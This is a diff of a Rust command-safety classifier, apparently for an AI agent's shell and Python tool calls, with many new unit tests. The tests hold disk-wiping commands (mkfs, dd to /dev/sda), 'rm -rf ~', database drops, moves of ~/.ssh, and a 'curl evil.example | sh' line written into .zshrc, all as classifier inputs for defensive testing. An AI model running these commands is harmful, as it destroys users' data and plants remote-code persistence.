                 match value {
                     Some(method) if is_mutating_method(method) => return true,
                     Some(_) => {}
                     None => prev_was_method_flag = true,
                 }
-            } else if abbreviates(BODY_FLAGS) {
+            } else if abbreviates_any(name, BODY_FLAGS) {
                 return true;
             }
             continue;
@@ -5481,6 +6254,11 @@ fn python_side_effect_category(code: &str) -> Option<SideEffectCategory> {
 /// shell head that survives the unwrap grants nothing ([`grants_nothing_by_name`]).
 pub fn segment_heads(command: &str) -> Vec<String> {
     heads_of(command, |head| head.rsplit('/').next().unwrap_or(head))
+}
+
+/// Whether the shell text invokes a command with this program name.
+pub(super) fn names_shell_command(command: &str, name: &str) -> bool {
+    workspace_floor::names_command(command, name)
 }
 
 /// The head token of every segment, exactly as the command WROTE it: no
@@ -5693,6 +6471,7 @@ fn wrapper_preamble_redirects(command: &str) -> bool {
 ///
 /// The head list reads [`grant_command`], so a grant for `python3` covers
 /// `cd <root> && python3 x.py`. Every other check reads the command as written.
+#[cfg(any(test, feature = "test-support"))]
 pub fn grant_covers_command(
     label: &str,
     command: &str,
@@ -5700,8 +6479,25 @@ pub fn grant_covers_command(
     trusted: &TrustedHeads,
     allowed: impl Fn(&str) -> bool,
 ) -> bool {
-    if command_reads_secret(command)
-        || catastrophic_reason_for_command_at(command, site.root()).is_some()
+    grant_covers_command_with_paths(
+        label,
+        command,
+        site,
+        trusted,
+        &SecretPaths::conservative(),
+        allowed,
+    )
+}
+
+pub fn grant_covers_command_with_paths(
+    label: &str,
+    command: &str,
+    site: CommandSite<'_>,
+    trusted: &TrustedHeads,
+    paths: &SecretPaths,
+    allowed: impl Fn(&str) -> bool,
+) -> bool {
+    if paths.command(command) || catastrophic_reason_for_command_at(command, site.root()).is_some()
     {
         return false;
     }
@@ -5792,6 +6588,13 @@ pub fn command_may_write_under(command: &str, dirs: &[&str]) -> bool {
         .as_ref()
         .map_or(script.as_str(), |h| h.text.as_str());
     !script_only_reads(blanked, LineFacts::of(&script), 0, &names)
+}
+
+/// True when every segment of `script` only reads ([`script_only_reads`]) and
+/// it redirects output nowhere. A read may still run code that a config file
+/// names, as `git` runs hooks and filters.
+pub(crate) fn script_proven_read_only(script: &str) -> bool {
+    script_only_reads(script, LineFacts::of(script), 0, &|_| true)
 }
 
 /// The word that stands in for a `$(...)` or backtick's output while
@@ -6072,7 +6875,7 @@ fn segment_only_reads(segment: &str, raw: &str, line: LineFacts) -> bool {
 }
 
 /// True when assigning the variable `name` can change what a later head runs
-/// or where it writes. That is a [`CODE_INJECTING_ENV_NAMES`] entry, or
+/// or where it writes. That is a `CODE_INJECTING_ENV_NAMES` entry, or
 /// `TMPDIR`, where `sort` and others write temporary files.
 fn steers_later_heads(name: &str) -> bool {
     is_code_injecting_env_name(name) || name == "TMPDIR"
@@ -6540,6 +7343,324 @@ mod tests {
     const TEXT_ONLY: CommandSite<'static> = CommandSite::TextOnly { root: None };
 
     #[test]
+    fn executed_heads_drop_only_a_real_command_lookup() {
+        let heads = |line: &str| {
+            let toks: Vec<&str> = line.split_whitespace().collect();
+            executed_head_candidates(&toks)
+                .into_iter()
+                .map(|(head, _)| head)
+                .collect::<Vec<_>>()
+        };
+        for lookup in [
+            "command -v pg_ctl",
+            "sudo command -pV pg_ctl",
+            "command -p -v rm",
+        ] {
+            assert!(heads(lookup).is_empty(), "{lookup}: {:?}", heads(lookup));
+        }
+        // `command` here is an option value, part of an assignment, a
+        // redirect target, or a prefix that runs, so `rm` may run.
+        for runs in [
+            "env -u command -v rm -rf ~",
+            "env -i -u command -v rm -rf ~",
+            "env A=x\\ command -v rm -rf ~",
+            "env > command -v rm -rf ~",
+            "command -p rm -rf ~",
+        ] {
+            assert!(
+                heads(runs).iter().any(|h| h == "rm"),
+                "{runs}: {:?}",
+                heads(runs)
+            );
+        }
+        // The danger scans keep every reading.
+        let toks: Vec<&str> = "command -v rm -rf ~".split_whitespace().collect();
+        assert!(danger_head_candidates(&toks).iter().any(|(h, _)| h == "rm"));
+    }
+
+    #[test]
+    fn phase7_disk_operations_in_shell_data_are_not_catastrophic() {
+        for command in [
+            "cat > data/example.txt <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<'EOF'\n$(dd if=/dev/zero of=/dev/rdisk0)\nEOF",
+            "cat <<'EOF'\n`mkfs.ext4 /dev/sda`\nEOF",
+            "cat <<EOF\nmkfs.ext4 /dev/sda\nEOF",
+            "cat - {a,b} <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "printf '%s\\n' 'mkfs.ext4 /dev/sda'",
+            "printf '%s\\n' '> /dev/sda'",
+            "printf '%s\\n' 2>&1 '> /dev/sda'",
+            "printf '%s\\n' 0<&1 '>| /dev/sda'",
+            "printf '%s\\n' '>& /dev/sda'",
+            "printf '%s\\n' '<> /dev/sda'",
+            "printf '%s\\n' '>>! /dev/disk0'",
+            "printf '%s\\n' '>>| /dev/sda'",
+            "printf '%s\\n' '&>> /dev/sda'",
+            "printf '%s\\n' '{ mkfs.ext4 /dev/sda; }'",
+            "printf '%s\\n' '(mkfs.ext4 /dev/sda)'",
+            "printf '%s\\n' 'if true; then mkfs.ext4 /dev/sda; fi'",
+            "printf '%s\\n' 'echo /dev/sda | xargs mkfs.ext4'",
+            "cat <<'EOF'\necho of=/dev/sda | xargs dd if=/dev/zero\nEOF",
+            "printf '%s\\n' 'mkfs.ext4 /dev/sda' &>/dev/null",
+            "cat <<'EOF' &>/dev/null\nmkfs.ext4 /dev/sda\nEOF",
+            "cat &>/dev/null cat <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<'EOF' >| /tmp/example\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<'EOF' >>| /tmp/example\nmkfs.ext4 /dev/sda\nEOF",
+            "cat '|' <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<'EOF'; printf x | cat\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<'EOF' || printf x | cat\nmkfs.ext4 /dev/sda\nEOF",
+            "echo 'dd if=/dev/zero of=/dev/sda'",
+            "# mkfs.ext4 /dev/sda\ngit status",
+            "  # mkfs.ext4 /dev/sda\n\n # dd of=/dev/sda\ngit status",
+            "# mkfs.ext4 /dev/sda",
+            "cat > /dev/null <<'EOF'\n> /dev/sda\nEOF",
+        ] {
+            assert_eq!(catastrophic_reason_for_command(command), None, "{command}");
+            for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                assert_ne!(
+                    static_classify(tool, &json!({"command": command}), TEXT_ONLY),
+                    StaticVerdict::Settled(RiskLane::Catastrophic),
+                    "{tool}: {command}",
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_disk_operations_in_python_data_are_not_catastrophic() {
+        for code in [
+            "print('mkfs.ext4 /dev/sda')",
+            "print('{ mkfs.ext4 /dev/sda; }')",
+            "print('(mkfs.ext4 /dev/sda)')",
+            "description = 'dd if=/dev/zero of=/dev/rdisk0'\nprint(description)",
+            "from pathlib import Path\nPath('example.txt').write_text('mkfs.ext4 /dev/sda')",
+        ] {
+            for tool in [tn::RUN_PYTHON, tn::RUN_PYTHON_BACKGROUND] {
+                assert_ne!(
+                    static_classify(tool, &json!({"code": code}), TEXT_ONLY),
+                    StaticVerdict::Settled(RiskLane::Catastrophic),
+                    "{tool}: {code}",
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_background_redirect_preserves_both_shell_interpretations() {
+        for command in [
+            "true &>/dev/null mkfs.ext4 /dev/sda",
+            "sh -c 'true &>/dev/null mkfs.ext4 /dev/sda'",
+            "sh -c 'true &> /dev/null dropdb lucidos_example'",
+            "true &>>/dev/null dropdb lucidos_example",
+            "dd &>/dev/null of=/dev/sda",
+            "cat &>/dev/null sh <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "cat &>/dev/null sh <<'EOF'\ndropdb lucidos_example\nEOF",
+        ] {
+            assert!(
+                catastrophic_reason_for_command(command).is_some(),
+                "{command}"
+            );
+            for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                assert_eq!(
+                    static_classify(tool, &json!({"command": command}), TEXT_ONLY),
+                    StaticVerdict::Settled(RiskLane::Catastrophic),
+                    "{tool}: {command}",
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_unproven_compounds_keep_the_original_floor() {
+        for body in ["mkfs.ext4 /dev/sda", "dropdb lucidos_example"] {
+            for wrapper in ["unshare", "fakeroot", "nsenter", "pkexec", "proot"] {
+                for command in [
+                    format!("{{ cat <<'EOF'; }} | {wrapper}\n{body}\nEOF"),
+                    format!("( cat <<'EOF' ) | {wrapper}\n{body}\nEOF"),
+                    format!("if true; then cat <<'EOF'; fi | {wrapper}\n{body}\nEOF"),
+                    format!("for item in once; do cat <<'EOF'; done | {wrapper}\n{body}\nEOF"),
+                    format!("{{ cat <<'EOF'\n{body}\nEOF\n}} | {wrapper}"),
+                    format!("( cat <<'EOF'\n{body}\nEOF\n) | {wrapper}"),
+                    format!("if true; then cat <<'EOF'\n{body}\nEOF\nfi | {wrapper}"),
+                    format!("for item in once; do cat <<'EOF'\n{body}\nEOF\ndone | {wrapper}"),
+                ] {
+                    assert!(
+                        catastrophic_reason_for_command(&command).is_some(),
+                        "{command}"
+                    );
+                    // The disk floor stays unconditional. A workspace match
+                    // the walk cannot place asks the owner.
+                    for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                        let verdict =
+                            static_classify(tool, &json!({"command": command}), TEXT_ONLY);
+                        assert!(
+                            verdict == StaticVerdict::Settled(RiskLane::Catastrophic)
+                                || (!body.starts_with("mkfs")
+                                    && verdict
+                                        == StaticVerdict::SettledIrreversible(
+                                            SideEffectCategory::UnprovenWorkspaceDestruction,
+                                        )),
+                            "{tool}: {command}: {verdict:?}",
+                        );
+                    }
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_background_redirect_siblings_do_not_consume_recursion() {
+        for count in [8, 64] {
+            for text in ["mkfs.ext4 /dev/sda", "dropdb lucidos_example"] {
+                let command = format!(
+                    "printf '%s' '{text}' &>/dev/null {}",
+                    "true &>/dev/null ".repeat(count),
+                );
+                assert_eq!(catastrophic_reason_for_command(&command), None, "{command}");
+                for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                    assert_ne!(
+                        static_classify(tool, &json!({"command": command}), TEXT_ONLY),
+                        StaticVerdict::Settled(RiskLane::Catastrophic),
+                        "{tool}: {command}",
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_stdin_wrappers_keep_the_disk_floor() {
+        for wrapper in ["xargs", "gxargs", "parallel"] {
+            for command in [
+                format!("echo /dev/sda | {wrapper} mkfs.ext4"),
+                format!("echo of=/dev/sda | {wrapper} dd if=/dev/zero"),
+            ] {
+                assert!(
+                    catastrophic_reason_for_command(&command).is_some(),
+                    "{command}"
+                );
+                for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                    assert_eq!(
+                        static_classify(tool, &json!({"command": command}), TEXT_ONLY),
+                        StaticVerdict::Settled(RiskLane::Catastrophic),
+                        "{tool}: {command}",
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn phase7_disk_operations_that_execute_remain_catastrophic() {
+        for command in [
+            "# harmless comment\nmkfs.ext4 /dev/sda",
+            "# harmless comment\necho of=/dev/sda | xargs dd if=/dev/zero",
+            "mkfs.ext4 /dev/sda",
+            "{ dd o'f='/dev/sda; }",
+            "( dd o'f='/dev/sda )",
+            "sudo mkfs.apfs /dev/disk0",
+            "dd if=/dev/zero of=/dev/rdisk0",
+            "printf x > /dev/mapper/example",
+            "printf x >| /dev/sda",
+            "printf x >! /dev/disk0",
+            "printf x >>! /dev/disk0",
+            "printf x >>| /dev/sda",
+            "printf x &>> /dev/sda",
+            "printf x >&/dev/sda",
+            "printf x >& /dev/sda",
+            "printf x &>/dev/sda",
+            "printf x <> /dev/sda",
+            "cat <<'EOF' > /dev/sda\ntext\nEOF",
+            "cat <<'EOF' | sh\nmkfs.ext4 /dev/sda\nEOF",
+            "sh <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            "cat <<EOF\n$(dd if=/dev/zero of=/dev/sda)\nEOF",
+            "cat <<EOF\n`mkfs.ext4 /dev/sda`\nEOF",
+            "printf '%s' \"$(dd if=/dev/zero of=/dev/sda)\"",
+            "git status; env bash -c 'mkfs.ext4 /dev/sda'",
+            "eval 'mkfs.ext4 /dev/sda'",
+            "sh <<'EOF'\nmkfs.ext4 /dev/sda",
+            "cat <<'EOF'\nsafe\nEOF\nmkfs.ext4 /dev/sda",
+        ] {
+            assert!(
+                catastrophic_reason_for_command(command).is_some(),
+                "{command}"
+            );
+            for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                assert_eq!(
+                    static_classify(tool, &json!({"command": command}), TEXT_ONLY),
+                    StaticVerdict::Settled(RiskLane::Catastrophic),
+                    "{tool}: {command}",
+                );
+            }
+        }
+        for tool in [tn::RUN_PYTHON, tn::RUN_PYTHON_BACKGROUND] {
+            let code = "import subprocess; subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda'])";
+            assert_eq!(
+                static_classify(tool, &json!({"code": code}), TEXT_ONLY),
+                StaticVerdict::Settled(RiskLane::Catastrophic),
+                "{tool}: {code}",
+            );
+        }
+    }
+
+    #[test]
+    fn phase7_disk_character_devices_are_not_raw_disks() {
+        for command in [
+            "dd if=/dev/zero of=/dev/null",
+            "printf x > /dev/stdout",
+            "printf x > /dev/zero",
+            "printf x >| /dev/null",
+            "printf x >! /dev/stdout",
+            "printf x >>! /dev/stdout",
+            "printf x >>| /dev/null",
+            "printf x &>> /dev/null",
+            "printf x >& /dev/null",
+            "printf x >&/dev/stdout",
+            "printf x &>/dev/null",
+            "printf x <> /dev/null",
+        ] {
+            assert_eq!(catastrophic_reason_for_command(command), None, "{command}");
+        }
+    }
+
+    #[test]
+    fn workspace_operations_inside_data_are_not_catastrophic_for_any_tool() {
+        for command in [
+            "python3 - <<'PY'\nimport os,shutil\nprint(os.environ.get('LUCIDOS_PG_BIN_DIR'))\nprint(shutil.which('pg_ctl'))\nPY",
+            "cat > fixture.rs <<'EOF'\npg_ctl -D /tmp/lucidos_example stop\nEOF",
+            "python3 - <<'PY'\nfrom pathlib import Path\nPath('handoff.md').write_text('Use LUCIDOS_PG_BIN_DIR and pg_ctl')\nPY",
+            "cat <<'EOF'\n$(dropdb lucidos_example)\nEOF",
+            "printf '%s\\n' 2>&1 'dropdb lucidos_example'",
+            "cat <<'EOF' &>/dev/null\ndropdb lucidos_example\nEOF",
+            "cat &>/dev/null cat <<'EOF'\ndropdb lucidos_example\nEOF",
+            "cat <<'EOF' >| /tmp/example\ndropdb lucidos_example\nEOF",
+            "cat '|' <<'EOF'\ndropdb lucidos_example\nEOF",
+            "cat <<'EOF'; printf x | cat\ndropdb lucidos_example\nEOF",
+            "cat <<'EOF' || printf x | cat\ndropdb lucidos_example\nEOF",
+        ] {
+            assert_eq!(catastrophic_reason_for_command(command), None, "{command}");
+            for tool in [tn::RUN_BASH, tn::RUN_BASH_BACKGROUND] {
+                assert_ne!(static_classify(tool, &json!({"command": command, "code": command}), TEXT_ONLY),
+                    StaticVerdict::Settled(RiskLane::Catastrophic), "{tool}: {command}");
+            }
+        }
+        for tool in [tn::RUN_PYTHON, tn::RUN_PYTHON_BACKGROUND] {
+            for (catastrophic, code) in [
+                (false, "from pathlib import Path\nPath('handoff.md').write_text('Use LUCIDOS_PG_BIN_DIR and pg_ctl')"),
+                (false, "description = 'dropdb lucidos_example'\nprint(description)"),
+                (true, "db = 'lucidos_example'\nimport subprocess\nsubprocess.run(['dropdb', db])"),
+                (true, "'''script'''\nimport subprocess\nsubprocess.run(['dropdb', 'lucidos_example'])"),
+            ] {
+                assert_eq!(
+                    static_classify(tool, &json!({"code": code}), TEXT_ONLY)
+                        == StaticVerdict::Settled(RiskLane::Catastrophic),
+                    catastrophic,
+                    "{tool}: {code}",
+                );
+            }
+        }
+    }
+
+    #[test]
     fn cleanup_floor_blocks_every_tool_and_broad_grant_without_running_commands() {
         let temp = tempfile::tempdir().unwrap();
         let ws = temp.path().join("workspace");
@@ -6562,7 +7683,15 @@ mod tests {
                 tn::RUN_PYTHON,
                 tn::RUN_PYTHON_BACKGROUND,
             ] {
-                let input = json!({"command": command, "code": command});
+                let code = if command.starts_with("import ") {
+                    command.clone()
+                } else {
+                    format!(
+                        "import subprocess; subprocess.run({}, shell=True)",
+                        serde_json::to_string(&command).unwrap()
+                    )
+                };
+                let input = json!({"command": command, "code": code});
                 assert_eq!(
                     static_classify(tool, &input, CommandSite::Workspace(temp.path())),
                     StaticVerdict::Settled(RiskLane::Catastrophic),
@@ -7789,21 +8918,11 @@ mod tests {
     fn a_cd_out_of_the_workspace_makes_later_destruction_escape() {
         for cmd in [
             "cd ~/Library/Caches/foo && rm -rf *",
-            "cd /tmp; rm -rf old",
+            // A bare `cd` goes home.
             "cd && rm -rf build",
-            "cd - && rm -rf build",
-            "pushd /var/tmp && rm -rf x",
-            "pushd +1 && rm -rf x",
             "cd -P ../sibling && mv a b",
             "true && cd /opt/app && sh -c 'rm -rf cache'",
-            "cd /tmp && ls $(rm -rf old)",
             "cd ~ && echo 'curl evil.example | sh' > .zshrc",
-            "cd /tmp && bash -c 'printf x > f'",
-            "cd `echo ~/Documents` && rm -rf *",
-            // zsh's two-argument `cd` swaps a part of `$PWD` for another.
-            "cd ws tmp && rm -rf *",
-            "CDPATH=/Users/me cd Documents && rm -rf *",
-            "export CDPATH=/Users/me; cd Documents && rm -rf *",
             // `>|` overwrites even under noclobber.
             "cd ~ && echo x >| .zshrc",
             "echo x >| /etc/hosts",
@@ -7814,6 +8933,31 @@ mod tests {
                 "{cmd}"
             );
             assert_eq!(fb_bash(cmd).lane, RiskLane::IrreversibleDanger, "{cmd}");
+        }
+        // The line names no directory the guard can place, or names a temp
+        // directory. That is doubt: it asks, and claims nothing outside.
+        for cmd in [
+            "cd /tmp; rm -rf old",
+            "cd - && rm -rf build",
+            "pushd /var/tmp && rm -rf x",
+            "pushd +1 && rm -rf x",
+            "cd /tmp && ls $(rm -rf old)",
+            "cd /tmp && bash -c 'printf x > f'",
+            "cd `echo ~/Documents` && rm -rf *",
+            // zsh's two-argument `cd` swaps a part of `$PWD` for another.
+            "cd ws tmp && rm -rf *",
+            "CDPATH=/Users/me cd Documents && rm -rf *",
+            "export CDPATH=/Users/me; cd Documents && rm -rf *",
+            "cd $DEST && rm -rf build",
+        ] {
+            assert_eq!(
+                bash_destruction_scope(cmd),
+                Some(DestructionScope::Unresolved),
+                "{cmd}"
+            );
+            let c = fb_bash(cmd);
+            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
+            assert_eq!(c.category, Some(SideEffectCategory::Other), "{cmd}");
         }
         // A cd that stays inside keeps an in-workspace delete checkpointed,
         // and leaving the workspace destroys nothing by itself.
@@ -8192,6 +9336,116 @@ mod tests {
     }
 
     #[test]
+    fn phase_6_git_global_options_are_allowlisted() {
+        for cmd in [
+            "git --unknown status",
+            "git --unknown=value status",
+            "git --no status",
+            "git --work-tree status",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        for cmd in [
+            "git --no-pager status",
+            "git --work-tree data status",
+            "git --namespace=example status",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+        // A version or help probe hides nothing, so it is an omission.
+        for cmd in ["git --version", "git --help"] {
+            assert!(
+                matches!(bash(cmd), StaticVerdict::NeedsJudge(ref ji) if !ji.fast_path_refused),
+                "{cmd}: {:?}",
+                bash(cmd)
+            );
+        }
+    }
+
+    #[test]
+    fn phase_6_git_reflog_only_proves_explicit_reads() {
+        for cmd in [
+            "git reflog delete HEAD",
+            "git reflog expire --all",
+            "git reflog future HEAD",
+            "git reflog main",
+        ] {
+            assert!(
+                matches!(bash(cmd), StaticVerdict::NeedsJudge(ref ji) if !ji.fast_path_refused),
+                "{cmd}: {:?}",
+                bash(cmd)
+            );
+        }
+        for cmd in [
+            "git reflog",
+            "git reflog -n 20",
+            "git reflog --oneline",
+            "git reflog show",
+            "git reflog exists HEAD",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    #[test]
+    fn phase_6_git_long_options_cover_every_nonempty_prefix() {
+        for flag in ["output", "output-directory"] {
+            for end in 1..=flag.len() {
+                let cmd = format!("git diff --{}=data/report.txt", &flag[..end]);
+                assert_needs_judge(bash(&cmd), &cmd);
+            }
+        }
+        for end in 1..="open-files-in-pager".len() {
+            let cmd = format!("git grep --{} TODO", &"open-files-in-pager"[..end]);
+            assert_needs_judge(bash(&cmd), &cmd);
+        }
+        let pathspec = "git diff -- --out";
+        assert_settled(bash(pathspec), RiskLane::Safe, pathspec);
+    }
+
+    #[test]
+    fn phase_6_python_imports_must_be_proven() {
+        for code in [
+            "import extra_module",
+            "import math, extra_module as extra",
+            "from extra_module import value",
+            "from .math import value",
+            "if True: import extra_module",
+            "from math import sin; import extra_module",
+            "import math; import extra_module # comment",
+            "import subprocess",
+        ] {
+            assert!(
+                matches!(python(code), StaticVerdict::NeedsJudge(ref ji) if !ji.fast_path_refused),
+                "{code}: {:?}",
+                python(code)
+            );
+        }
+        for code in [
+            "import math as m; print(m.sqrt(4))",
+            "import time; time.sleep(12)",
+            "from math import (sin, cos); print(sin(0))",
+            "print('import extra_module') # import extra_module",
+            "d = {'a': 1}; print(f\"{d['a']}\")",
+            "total = 1 + \\\n    2\nprint(total)",
+            "try:\n    int('x')\nexcept ValueError as e:\n    raise RuntimeError('bad') from e",
+            "import math\ndef f():\n    yield from range(3)\nprint(math.pi, list(f()))",
+        ] {
+            assert_settled(python(code), RiskLane::Safe, code);
+        }
+        for code in [
+            "from extra_module \\\n    import value",
+            "import math, \\\n    extra_module",
+        ] {
+            assert!(
+                matches!(python(code), StaticVerdict::NeedsJudge(_)),
+                "{code}: {:?}",
+                python(code)
+            );
+        }
+    }
+
+    #[test]
     fn git_config_injection_goes_to_judge() {
         for cmd in [
             "git -c core.pager=reboot log",
@@ -8527,8 +9781,7 @@ mod tests {
     fn python_pure_compute_and_reads_are_safe() {
         for code in [
             "print(sum(range(100)))",
-            "import pandas as pd; pd.read_csv('data/x.csv')",
-            "import requests; requests.get('https://example.com').json()", // GET, no signal
+            "import json; print(json.load(open('data/x.json')))",
             "open('data/out.txt','w').write('hi')",
         ] {
             assert_settled(python(code), RiskLane::Safe, code);
@@ -8690,9 +9943,17 @@ mod tests {
             "cp data/a ~/b",
             None,
             None,
+            Some(Path::new(HOME))
+        ));
+        // With no home to expand to, `~` is doubt, and doubt is no evidence.
+        assert!(!command_names_path_outside(
+            "cp data/a ~/b",
+            None,
+            None,
             None
         ));
-        assert!(command_names_path_outside(
+        // A scratch target is not outside.
+        assert!(!command_names_path_outside(
             "echo x > /tmp/y",
             None,
             None,
@@ -8740,11 +10001,21 @@ mod tests {
             r"echo x > .\./x",
             "rm -rf '..'/x",
             "rm -rf .'.'",
-            r"sort \-o/../etc/x f",
         ] {
             assert!(command_names_path_outside(cmd, None, None, None), "{cmd}");
         }
-        for cmd in ["echo x > '..'/'..'/.zshrc", "echo x >> ..'/'x"] {
+        // A `..` inside an absolute path is doubt: no marker, and never Safe.
+        assert!(!command_names_path_outside(
+            r"sort \-o/../etc/x f",
+            None,
+            None,
+            None
+        ));
+        for cmd in [
+            "echo x > '..'/'..'/.zshrc",
+            "echo x >> ..'/'x",
+            r"sort \-o/../etc/x f",
+        ] {
             assert!(
                 !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                 "{cmd} must not settle Safe"
@@ -8810,12 +10081,19 @@ lucidos data write config/model-prices.json --from .lucidos/tmp/mp.json; lucidos
         for cmd in [r"sed -i 's/ *$//' data/notes.md", r"echo \$HOME/x > data/f"] {
             assert!(!command_names_path_outside(cmd, None, None, None), "{cmd}");
         }
+        // `$HOME` is the one expansion the guard can place.
         assert!(command_names_path_outside(
             "cp data/a \"$HOME\"/b",
             None,
             None,
-            None
+            Some(Path::new(HOME))
         ));
+        for cmd in ["cp data/a \"$DEST\"/b", "cp data/a $HOMEDIR/b"] {
+            assert!(
+                !command_names_path_outside(cmd, None, None, Some(Path::new(HOME))),
+                "{cmd}"
+            );
+        }
     }
 
     /// Quoted code still carries evidence: a literal path inside it.
@@ -8866,10 +10144,37 @@ print(subprocess.run('lucidos data write config/model-prices.json --from .lucido
             "lucidos model-prices | jq .override",
             "lucidos events query --type TaskDone --limit 5",
             "lucidos events count",
+            "lucidos diagnostic-log query",
+            "lucidos diagnostic-log query --since 30m --contains '[Voice]' --pid 77210",
+            "lucidos diagnostic-log query --json | jq .returned",
             "lucidos knowhow list",
             "lucidos knowhow read best-practices",
         ] {
             assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    #[test]
+    fn a_retargeted_or_unlisted_diagnostic_log_call_does_not_settle() {
+        for cmd in [
+            "lucidos diagnostic-log",
+            "lucidos diagnostic-log tail",
+            "sudo lucidos diagnostic-log query",
+            "env LUCIDOS_API_BASE_URL=http://x lucidos diagnostic-log query",
+            "export LUCIDOS_API_PORT=1; lucidos diagnostic-log query",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        for cmd in [
+            "LUCIDOS_API_BASE_URL=http://x lucidos diagnostic-log query",
+            "LUCIDOS_WORKSPACE=/tmp lucidos diagnostic-log query",
+            "LUCIDOS_API_PORT=1 lucidos diagnostic-log query",
+        ] {
+            assert!(
+                matches!(bash(cmd), StaticVerdict::NeedsJudge(ref ji) if ji.fast_path_refused),
+                "{cmd} must be a refusal, got {:?}",
+                bash(cmd)
+            );
         }
     }
 
@@ -8923,7 +10228,7 @@ print(subprocess.run('lucidos data write config/model-prices.json --from .lucido
             "import subprocess; print(subprocess.check_output('lucidos model-prices', shell=True, text=True))",
             "import subprocess\nsubprocess.call(\"git status\", shell=True, timeout=30,)",
             "import subprocess\nprint(subprocess.getoutput('lucidos knowhow list'))",
-            "import os.path, subprocess\nsubprocess.check_call(['lucidos', 'data', 'path', 'x'])",
+            "import json, subprocess\nsubprocess.check_call(['lucidos', 'data', 'path', 'x'])",
         ] {
             assert_settled(python(code), RiskLane::Safe, code);
         }
@@ -9073,6 +10378,7 @@ subprocess.run('ls\x3b id', shell=True)",
                 command: cmd.to_string(),
                 out_of_workspace: false,
                 fast_path_refused: false,
+                script_sources: vec![],
             },
             TEXT_ONLY,
         )
@@ -9085,6 +10391,7 @@ subprocess.run('ls\x3b id', shell=True)",
                 command: code.to_string(),
                 out_of_workspace: false,
                 fast_path_refused: false,
+                script_sources: vec![],
             },
             TEXT_ONLY,
         )
@@ -9126,6 +10433,7 @@ subprocess.run('ls\x3b id', shell=True)",
         match static_classify(tool, input, site) {
             StaticVerdict::NeedsJudge(ji) => fallback_classify(&ji, site),
             StaticVerdict::Settled(lane) => JudgedClassification {
+                judge_reason: None,
                 lane,
                 summary: None,
                 category: None,
@@ -9260,11 +10568,11 @@ subprocess.run('ls\x3b id', shell=True)",
         // mv removes its source. Undo deletes the files a command created, so
         // undoing a move in from outside would delete the only copy.
         for cmd in [
-            "mv /tmp/download.csv data/in.csv",
+            "mv /Users/me/download.csv data/in.csv",
             "mv ~/.ssh data/x",
-            "mv -f data/a /tmp/b data/",
-            "mv -tdata /tmp/download.csv",
-            "mv --target-directory=data /tmp/download.csv",
+            "mv -f data/a /etc/b data/",
+            "mv -tdata /Users/me/download.csv",
+            "mv --target-directory=data /Users/me/download.csv",
         ] {
             let c = fb_bash(cmd);
             assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
@@ -9273,6 +10581,17 @@ subprocess.run('ls\x3b id', shell=True)",
                 Some(SideEffectCategory::OutOfWorkspaceDestruction),
                 "{cmd}"
             );
+        }
+        // A scratch file is disposable, so a move in from the temp directory
+        // only needs the checkpoint its destination gets.
+        let dir = scratch_dir();
+        let d = dir.path().display();
+        for cmd in [
+            format!("mv {d}/download.csv data/in.csv"),
+            format!("mv -f data/a {d}/b data/"),
+            format!("mv -tdata {d}/download.csv"),
+        ] {
+            assert_eq!(fb_bash(&cmd).lane, RiskLane::ReversibleDanger, "{cmd}");
         }
     }
 
@@ -9663,8 +10982,6 @@ subprocess.run('ls\x3b id', shell=True)",
             "cat > /tmp/x.md",
             "grep x data/f > /private/tmp/out.txt",
             "cargo build > \"${TMPDIR:-/tmp}/build.log\" 2>&1",
-            "ls > /var/folders/ab/cd/T/ls.txt",
-            "ls > /private/var/folders/ab/cd/T/ls.txt",
             "ls > /tmp/run-1/a_b.c,d@e%f",
         ] {
             assert!(judged_as_omission(cmd), "{cmd}");
@@ -9727,9 +11044,9 @@ subprocess.run('ls\x3b id', shell=True)",
     }
 
     /// A scratch target a link, a shared file or another segment can turn
-    /// into somebody else's file stays out-of-workspace destruction.
+    /// into somebody else's file is doubt. It asks, and claims nothing outside.
     #[test]
-    fn an_unsafe_scratch_target_stays_out_of_workspace_destruction() {
+    fn an_unsafe_scratch_target_asks_without_claiming_outside() {
         let dir = scratch_dir();
         let p = dir.path();
         let d = p.display();
@@ -9767,7 +11084,14 @@ subprocess.run('ls\x3b id', shell=True)",
         ] {
             assert_eq!(
                 bash_destruction_scope(&cmd),
-                Some(DestructionScope::OutOfWorkspace),
+                Some(DestructionScope::Unresolved),
+                "{cmd}"
+            );
+            let c = fb_bash(&cmd);
+            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
+            assert_ne!(
+                c.category,
+                Some(SideEffectCategory::OutOfWorkspaceDestruction),
                 "{cmd}"
             );
         }
